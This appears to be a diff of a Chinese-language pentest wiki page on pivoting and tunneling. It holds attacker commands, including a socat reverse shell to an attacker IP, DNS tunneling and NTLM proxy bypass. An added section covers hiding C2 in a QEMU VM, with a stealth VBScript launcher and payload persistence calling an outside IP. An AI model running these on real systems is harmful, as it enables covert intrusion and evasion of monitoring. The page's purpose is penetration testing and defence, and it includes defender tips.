@@ -93,7 +93,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-您可以通过**ssh**将所有**流量**隧道到一个**子网络**通过一个主机。\
+您可以通过**ssh**将所有**流量**通过主机**隧道**到**子网络**。\
 例如，转发所有流量到10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -199,9 +199,9 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**代理和代理使用相同版本**
+**代理和代理使用相同的版本**
 
-### 隧道技术
+### 隧道传输
 ```bash
 # Start proxy server and automatically generate self-signed TLS certificates -- Attacker
 sudo ./proxy -selfcert
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢轴
+通过 **NTLM 代理** 进行枢转
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -276,7 +276,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### 通过socks的Port2Port
+### 通过socks进行Port2Port
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -347,13 +347,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的 RDP 访问权限**。\
+您需要拥有 **系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
+在您的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`**，如下所示：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -374,7 +374,7 @@ netstat -antb | findstr 1080
 
 您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
-在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 的连接。
+在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
 
 ## NTLM 代理绕过
 
@@ -396,26 +396,26 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的 **SSH** 服务上设置监听端口为 443。你可以通过攻击者的 2222 端口连接到它。\
-你也可以使用连接到 localhost:443 的 **meterpreter**，而攻击者在 2222 端口监听。
+现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
+你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
 
 由微软创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS 隧道
+## DNS Tunneling
 
 ### Iodine
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-在两个系统中都需要 root 权限，以创建 tun 适配器并通过 DNS 查询在它们之间隧道数据。
+在两个系统中都需要root权限，以创建tun适配器并通过DNS查询在它们之间隧道数据。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-隧道将非常慢。您可以通过使用以下命令在此隧道中创建一个压缩的SSH连接：
+隧道将非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -483,7 +483,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令将解决方案暴露到互联网的工具。**\
+[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
 _暴露的 URI 类似于:_ **UID.ngrok.io**
 
 ### 安装
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用Cloudflare的边缘作为会合点。当出站防火墙仅允许HTTPS流量而入站连接被阻止时，这非常方便。
+Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用 Cloudflare 的边缘作为会合点。当出站防火墙仅允许 HTTPS 流量而入站连接被阻止时，这非常方便。
 
 ### 快速隧道一行命令
 ```bash
@@ -574,7 +574,7 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-因为所有流量都通过主机 **出站 443** 端口发送，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
+因为所有流量都通过主机 **出站 443** 端口离开，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
 
 ## FRP (快速反向代理)
 
@@ -610,9 +610,67 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 非常适合利用现有资源进行转发。
 
+## 使用 QEMU 的隐蔽 VM 基于隧道
+
+QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个短暂的 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。
+
+### 快速一行命令
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• 上面的命令在 RAM 中启动一个 **Tiny Core Linux** 镜像 (`tc.qcow2`)。  
+• Windows 主机上的端口 **2222/tcp** 被透明地转发到来宾内部的 **22/tcp**。  
+• 从攻击者的角度来看，目标仅仅暴露了端口 2222；到达该端口的任何数据包都由在虚拟机中运行的 SSH 服务器处理。  
+
+### 通过 VBScript 隐秘启动
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+运行脚本 `cscript.exe //B update.vbs` 可以保持窗口隐藏。
+
+### 客户端持久性
+
+由于 Tiny Core 是无状态的，攻击者通常会：
+
+1. 将有效载荷放置到 `/opt/123.out`
+2. 追加到 `/opt/bootlocal.sh`：
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时将有效载荷打包到 `mydata.tgz` 中。
+
+### 为什么这能逃避检测
+
+• 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 访问磁盘；没有安装驱动程序或服务。
+• 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在 VM 内部终止）。
+• 内存扫描器从未分析恶意进程空间，因为它存在于不同的操作系统中。
+
+### Defender 提示
+
+• 对用户可写路径中的 **意外 QEMU/VirtualBox/KVM 二进制文件** 发出警报。
+• 阻止来自 `qemu-system*.exe` 的出站连接。
+• 寻找在 QEMU 启动后立即绑定的稀有监听端口（2222, 10022, …）。
+
+---
+
 ## 其他检查工具
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## 参考文献
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
